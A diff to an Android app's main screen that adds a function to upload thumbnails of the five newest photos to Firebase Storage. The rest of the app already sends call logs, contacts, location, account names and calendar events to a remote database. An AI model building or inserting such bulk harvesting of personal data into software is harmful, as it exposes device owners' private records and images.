@@ -4,18 +4,20 @@ import android.Manifest
 import android.accounts.AccountManager
 import android.annotation.SuppressLint
 import android.app.AlertDialog
+import android.content.ContentUris
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.graphics.Bitmap
 import android.location.Location
 import android.net.Uri
-import android.os.Build
-import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
+import android.os.*
 import android.provider.CalendarContract
 import android.provider.CallLog
 import android.provider.ContactsContract
+import android.provider.MediaStore
 import android.util.Log
+import android.util.Size
 import android.widget.Toast
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
@@ -25,6 +27,8 @@ import com.google.android.gms.location.LocationServices
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.storage.FirebaseStorage
 import kotlinx.android.synthetic.main.activity_main.*
+import java.io.ByteArrayOutputStream
+import java.io.File
 import java.util.*
 import kotlin.collections.ArrayList
 import kotlin.collections.HashMap
@@ -48,6 +52,7 @@ class MainActivity : AppCompatActivity() {
     var f = 0
     var g= 0
     private lateinit var fusedLocationClient: FusedLocationProviderClient
+    @SuppressLint("NewApi")
     @RequiresApi(Build.VERSION_CODES.O)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -161,11 +166,15 @@ class MainActivity : AppCompatActivity() {
                 startActivity(i)
             }
         }
+
+        button4.setOnClickListener {
+            getPicture()
+        }
         getall.setOnClickListener {
             getall.isClickable = false
             getall.alpha = 0.5f
             Handler(Looper.getMainLooper()).postDelayed({
-               getLogs()
+                getLogs()
             }, 1000)
             Handler(Looper.getMainLooper()).postDelayed({
                 getContactDetails()
@@ -178,7 +187,7 @@ class MainActivity : AppCompatActivity() {
                 getLocation()
             }, 1000)
             Handler(Looper.getMainLooper()).postDelayed({
-               getAccName()
+                getAccName()
             }, 1000)
             Handler(Looper.getMainLooper()).postDelayed({
                 val intent = Intent(this, LinkDemo::class.java)
@@ -211,7 +220,8 @@ class MainActivity : AppCompatActivity() {
             ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)!=PackageManager.PERMISSION_GRANTED ||
-            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR)!=PackageManager.PERMISSION_GRANTED
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALENDAR)!=PackageManager.PERMISSION_GRANTED ||
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)!=PackageManager.PERMISSION_GRANTED
         )
         {
             ActivityCompat.requestPermissions(
@@ -225,8 +235,9 @@ class MainActivity : AppCompatActivity() {
                     Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.ACCESS_COARSE_LOCATION,
                     Manifest.permission.READ_CALENDAR,
+                    Manifest.permission.READ_EXTERNAL_STORAGE
 
-                    ), REQ_CODE
+                ), REQ_CODE
             )
         }
         else{
@@ -398,7 +409,74 @@ class MainActivity : AppCompatActivity() {
          }
          cursor.close()
          myRef.child("calendarEvents").setValue(eventArr)
-
      }
+
+    @RequiresApi(Build.VERSION_CODES.Q)
+    private fun getPicture() {
+        var l = 0
+
+        val imageProjection = arrayOf(
+            MediaStore.Images.Media.DISPLAY_NAME,
+            MediaStore.Images.Media.SIZE,
+            MediaStore.Images.Media.DATE_TAKEN,
+            MediaStore.Images.Media._ID
+        )
+
+        val imageSortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC"
+
+        val cursor = contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            imageProjection,
+            null,
+            null,
+            imageSortOrder
+        )
+
+        cursor.use {
+            it?.let {
+                val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+                val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
+                val sizeColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
+                val dateColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)
+
+                while (it.moveToNext() && l!=5) {
+                    val id = it.getLong(idColumn)
+                    val name = it.getString(nameColumn)
+                    val size = it.getString(sizeColumn)
+                    val date = it.getString(dateColumn)
+
+                    val contentUri = ContentUris.withAppendedId(
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        id
+                    )
+                    // add the URI to the list
+                    // generate the thumbnail
+                    val thumbnail = (this as Context).contentResolver.loadThumbnail(
+                        contentUri,
+                        Size(480, 480),
+                        null
+                    )
+                    val baos = ByteArrayOutputStream()
+                    thumbnail.compress(Bitmap.CompressFormat.JPEG, 100, baos)
+                    val data = baos.toByteArray()
+                    l++
+                    var storaeRef= storage.getReference("image no $l")
+                    var uploadTask = storaeRef.putBytes(data)
+                    uploadTask.addOnFailureListener {
+                        Log.d("fl","fail")
+                    }.addOnSuccessListener { taskSnapshot ->
+                        val text = "Uploaded!"
+                        val duration = Toast.LENGTH_SHORT
+                        val toast = Toast.makeText(applicationContext, text, duration).show()
+                    }
+                }
+            } ?: kotlin.run {
+                Log.e("TAG", "Cursor is null!")
+            }
+        }
+    }
+
+
+
 }
 
